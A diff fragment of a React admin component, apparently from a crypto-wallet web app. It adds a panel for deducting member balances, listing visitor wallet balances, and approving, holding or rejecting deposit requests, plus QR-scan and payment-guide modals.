+                        setAdjustSavedMsg(`Deducted -$${amt.toLocaleString()} from ${adjustMemberEmail.trim().toLowerCase()}`);
+                        setAdjustReason('');
+                        setAdjustConfirmKeyword('');
+                        setTimeout(() => setAdjustSavedMsg(null), 3000);
+                      }}
+                      className="px-4 py-2 rounded-lg bg-red-600/80 hover:bg-red-600 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold cursor-pointer whitespace-nowrap"
+                    >
+                      Confirm Hold / Deduct (-$)
+                    </button>
+                  </div>
+                </div>
+              )}
+
+              {/* Active Loaded Balances Ledger */}
+              {Object.keys(memberWalletBalances).length > 0 && (
+                <div className="space-y-2">
+                  <div className="text-[11px] font-mono uppercase tracking-wider text-slate-300 font-bold">
+                    Visitor Personal Wallet Balances ({Object.keys(memberWalletBalances).length})
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
+                    {Object.entries(memberWalletBalances).map(([emailKey, bal]) => (
+                      <button
+                        key={emailKey}
+                        type="button"
+                        onClick={() => setAdjustMemberEmail(emailKey)}
+                        className="p-2.5 rounded-xl bg-[#040a18] border border-blue-900/70 hover:border-blue-400 text-left flex items-center justify-between gap-2 cursor-pointer"
+                      >
+                        <span className="text-[11px] font-mono text-slate-200 truncate">{emailKey}</span>
+                        <span className="text-xs font-mono font-bold text-emerald-300 tabular-nums shrink-0">
+                          ${Number(bal).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                        </span>
+                      </button>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* Visitor Wallet Funding Approval Queue */}
+              <div className="space-y-3">
+                <div className="text-xs font-bold text-white">
+                  Visitor Wallet Funding &amp; Load Requests ({walletLoadRequests.length})
+                </div>
+                {walletLoadRequests.length === 0 ? (
+                  <div className="p-6 text-center rounded-xl bg-[#040a18] border border-blue-900/60 text-xs text-slate-400">
+                    No visitor wallet deposit submissions yet.
+                  </div>
+                ) : (
+                  <div className="space-y-2.5">
+                    {walletLoadRequests.map((req) => (
+                      <div
+                        key={req.id}
+                        className={`p-3.5 rounded-xl border space-y-2.5 ${
+                          req.status === 'pending_approval'
+                            ? 'bg-gradient-to-r from-amber-950/25 via-blue-950/25 to-[#040a18] border-amber-500/45'
+                            : req.status === 'approved'
+                            ? 'bg-[#040a18] border-emerald-500/40'
+                            : 'bg-[#040a18] border-red-500/40'
+                        }`}
+                      >
+                        <div className="flex flex-wrap items-center justify-between gap-2">
+                          <div>
+                            <div className="text-xs font-bold text-white">
+                              {req.memberName} ({req.memberEmail}) —{' '}
+                              <span className="font-mono text-emerald-300 tabular-nums">
+                                ${req.amountUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                              </span>{' '}
+                              <span className="text-blue-300 font-mono">[{req.walletSymbol}]</span>
+                            </div>
+                            <div className="text-[11px] font-mono text-slate-400">
+                              Ref: {req.txReference} · {req.timeStr}
+                              {req.note ? ` · "${req.note}"` : ''}
+                            </div>
+                          </div>
+                          <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase bg-[#08142b] border border-blue-800/70 text-slate-200">
+                            {req.status.replace('_', ' ')}
+                          </span>
+                        </div>
+
+                        {req.status === 'pending_approval' || req.status === 'held' ? (
+                          <div className="flex flex-wrap items-center gap-2 pt-2 border-t border-blue-900/50">
+                            <input
+                              type="text"
+                              value={walletReviewNotes[req.id] || ''}
+                              onChange={(e) =>
+                                setWalletReviewNotes((prev) => ({ ...prev, [req.id]: e.target.value }))
+                              }
+                              placeholder="Optional approval / hold note..."
+                              className="flex-1 min-w-[160px] px-3 py-1.5 rounded-lg bg-[#08142b] border border-blue-900/70 text-xs text-white focus:outline-none focus:border-blue-400"
+                            />
+                            <input
+                              type="text"
+                              value={walletApproveConfirmInputs[req.id] || ''}
+                              onChange={(e) =>
+                                setWalletApproveConfirmInputs((prev) => ({ ...prev, [req.id]: e.target.value }))
+                              }
+                              aria-label={`Type CONFIRM to approve wallet request ${req.id}`}
+                              placeholder="Type CONFIRM..."
+                              className={`w-32 px-2.5 py-1.5 rounded-lg bg-[#08142b] border text-xs font-mono tracking-wider text-white placeholder:text-slate-500 focus:outline-none ${
+                                (walletApproveConfirmInputs[req.id] || '').trim() === 'CONFIRM'
+                                  ? 'border-emerald-500/70 focus:border-emerald-400'
+                                  : 'border-amber-500/45 focus:border-blue-400'
+                              }`}
+                            />
+                            <button
+                              type="button"
+                              disabled={(walletApproveConfirmInputs[req.id] || '').trim() !== 'CONFIRM'}
+                              onClick={() => {
+                                if ((walletApproveConfirmInputs[req.id] || '').trim() !== 'CONFIRM') return;
+                                onReviewWalletLoadRequest?.(req.id, 'approved', walletReviewNotes[req.id]);
+                                setWalletApproveConfirmInputs((prev) => ({ ...prev, [req.id]: '' }));
+                              }}
+                              className="px-3 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-500 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold cursor-pointer"
+                            >
+                              Confirm Payment &amp; Credit Balance
+                            </button>
+                            {req.status !== 'held' && (
+                              <button
+                                type="button"
+                                onClick={() => {
+                                  onReviewWalletLoadRequest?.(req.id, 'held', walletReviewNotes[req.id]);
+                                }}
+                                className="px-3 py-1.5 rounded-lg bg-amber-600 hover:bg-amber-500 text-white text-xs font-bold cursor-pointer"
+                              >
+                                Hold Funds
+                              </button>
+                            )}
+                            <button
+                              type="button"
+                              onClick={() => {
+                                onReviewWalletLoadRequest?.(req.id, 'rejected', walletReviewNotes[req.id]);
+                              }}
+                              className="px-3 py-1.5 rounded-lg bg-red-600/80 hover:bg-red-600 text-white text-xs font-bold cursor-pointer"
+                            >
+                              Reject
+                            </button>
+                          </div>
+                        ) : (
+                          req.adminNotes && (
+                            <div className="text-[11px] font-mono text-slate-300">
+                              Review note: {req.adminNotes}
+                            </div>
+                          )
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                )}
               </div>
             </div>
 
@@ -2294,6 +2889,18 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
         </div>
 
       </div>
+
+      <WalletScanModal
+        wallet={expandedQrWallet}
+        onClose={() => setExpandedQrWallet(null)}
+        titlePrefix="Official Company Wallet · Scan & Pay QR"
+      />
+
+      <CryptoPaymentGuideModal
+        isOpen={isCryptoGuideOpen}
+        onClose={() => setIsCryptoGuideOpen(false)}
+        wallets={companyWalletsDraft}
+      />
     </div>
   );
 };
